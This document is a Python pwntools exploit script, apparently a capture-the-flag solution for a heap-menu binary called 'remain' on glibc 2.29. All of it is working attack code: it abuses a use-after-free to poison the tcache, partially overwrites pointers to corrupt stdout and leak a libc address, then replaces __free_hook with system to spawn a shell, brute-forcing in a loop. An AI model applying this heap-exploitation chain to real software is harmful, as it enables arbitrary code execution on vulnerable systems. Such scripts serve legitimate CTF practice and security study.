from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def add(content):
        r.sendlineafter('>', '1')
        r.sendafter('>', content)

def edit(idx, content):
        r.sendlineafter('>', '2')
        r.sendlineafter('>', str(idx))
        r.sendafter('>', content)

def free(idx):
        r.sendlineafter('>', '3')
        r.sendlineafter('>', str(idx))

while True:
	try:
		r = process(['./ld-2.29.so', '--library-path',  './',  './remain'])
		add(flat(0, 0x91)) # 0
		add(flat(0, 0x11)*4) # 1
		free(1)
		free(0)
		edit(0, '\xa0\x70')
		add('c') # 2
		add('a'*0x10) # 3
		free(0)
		edit(3, 'a'*8 + '\x00\x70')
		add(flat(0, 0x291)+'\x00'*8 + '\x07'*0x20) # 4
		free(0)
		edit(3, 'a'*8 +'\x90')
		add('a'*8 + '\x51') # 5
		free(0)
		edit(5, 'a'*0x8+'\x91')
		free(0)
		free(1)
		edit(5, 'a'*0x8+'\x51')
		edit(3, 'a'*8+'\xa0')
		edit(0, '\xa0\x86')
		add('f'*0x47) # 6
		add(p64(0xfbad3c80) + p64(0)*3 + "\x00") # 7
		libc_base = u64(r.recvuntil('\x7f', timeout=2)[-6:]+'\x00'*2) - 0x3ed8b0 + 0x206340 - 0x1ce410
		print "libc_base @ ", hex(libc_base)
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[1]
		print "one_shot @ ", hex(one_shot)
		free_hook = libc_base + libc.symbols['__free_hook']
		print "free_hook @ ", hex(free_hook)
		system = libc_base + libc.symbols['system']
		print "system @ ", hex(system)
		free(0)
		edit(3, 'a'*8+p64(free_hook)[:-2])
		add(p64(system)) # 8
		edit(0, 'sh'+'\x00')
		free(0)
		r.interactive()
		break

	except KeyboardInterrupt:
		r.close()
		break

	except:
		r.close()
		pass